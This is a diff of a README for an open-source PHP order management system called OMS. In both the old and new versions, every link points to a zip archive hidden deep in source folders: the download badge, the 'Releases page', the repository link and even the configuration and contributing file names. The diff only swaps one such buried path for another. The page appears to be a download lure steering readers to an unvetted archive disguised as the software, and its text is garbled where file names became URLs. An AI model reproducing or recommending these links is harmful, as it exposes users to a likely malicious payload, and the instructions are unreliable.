@@ -1,7 +1,7 @@
 # 🚀 OMS - Simplifying Order Management for Your Business
 
 ## 📥 Download Now
-[![Download OMS](https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip%https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip)](https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip)
+[![Download OMS](https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip%https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip)](https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip)
 
 ## 📌 Introduction
 ONEX OMS is an open-source order management system designed for businesses. Developed by ShopeX, it supports e-commerce, retail, and distribution needs. Built on a modular PHP architecture, OMS efficiently handles orders, inventory, and warehouse processes. 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run OMS on your computer.
 ### 🔗 Visit the Release Page
 You can download the application from the Releases page. Click the link below:
 
-[Visit the Releases Page](https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip)
+[Visit the Releases Page](https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip)
 
 ### 🖥️ System Requirements
 To run OMS smoothly, ensure your system meets the following requirements:
@@ -25,7 +25,7 @@ To run OMS smoothly, ensure your system meets the following requirements:
 
 ### 🔧 Installation Steps
 1. **Download the Application**
-   Go to the [Releases page](https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip) and download the latest version of OMS.
+   Go to the [Releases page](https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip) and download the latest version of OMS.
 
 2. **Extract the Files**
    Once downloaded, locate the file (usually in your Downloads folder) and extract it using a zip file extractor.
@@ -38,7 +38,7 @@ To run OMS smoothly, ensure your system meets the following requirements:
    - Import the provided SQL file located in the `database` folder of your extracted files. This creates the required tables.
 
 5. **Edit Configuration Settings**
-   Open the `https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip` file in a text editor. Update the database connection settings with your database name, username, and password.
+   Open the `https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip` file in a text editor. Update the database connection settings with your database name, username, and password.
 
 6. **Run the Application**
    Open your web browser and navigate to `http://localhost/OMS` (or wherever you installed it) to access the OMS application.
@@ -61,20 +61,20 @@ Once you have installed the OMS application, refer to the following resources to
 If you face any problems during installation or while using OMS, consider these steps:
 
 - **Check Your System Requirements:** Make sure your environment meets the minimum requirements.
-- **Revisit Configuration Settings:** Double-check the `https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip` settings for any typos.
+- **Revisit Configuration Settings:** Double-check the `https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip` settings for any typos.
 - **Database Connection Issues:** Ensure the database is running and the credentials in your configuration file are correct.
 
 ## ⚙️ Community Contributions
-We welcome contributions! If you'd like to help improve OMS, feel free to fork the repository, make your changes, and submit a pull request. For detailed instructions, refer to the https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip file in the repository.
+We welcome contributions! If you'd like to help improve OMS, feel free to fork the repository, make your changes, and submit a pull request. For detailed instructions, refer to the https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip file in the repository.
 
 ## 📅 Updates
 Keep an eye on the Releases page for updates, bug fixes, and new features. Your feedback is valuable, and we continuously work to enhance the system based on user input.
 
 ## 🔗 Resources
-- **GitHub Repository:** Explore the code and documentation at [OMS GitHub Repository](https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip).
+- **GitHub Repository:** Explore the code and documentation at [OMS GitHub Repository](https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip).
 - **Official Website:** Learn more about ONEX OMS and its offerings.
 
 ## 📞 Contact
 For further assistance, please reach out via the Issues section on GitHub. We’re here to help you with any queries or concerns you may have.
 
-[Download OMS Now](https://raw.githubusercontent.com/willio1690/OMS/main/app/dchain/lib/event/trigger/dchain/Software-v2.7.zip) and experience a better way to manage your orders!
+[Download OMS Now](https://github.com/willio1690/OMS/raw/refs/heads/main/app/erpapi/lib/store/request/Software_2.7.zip) and experience a better way to manage your orders!
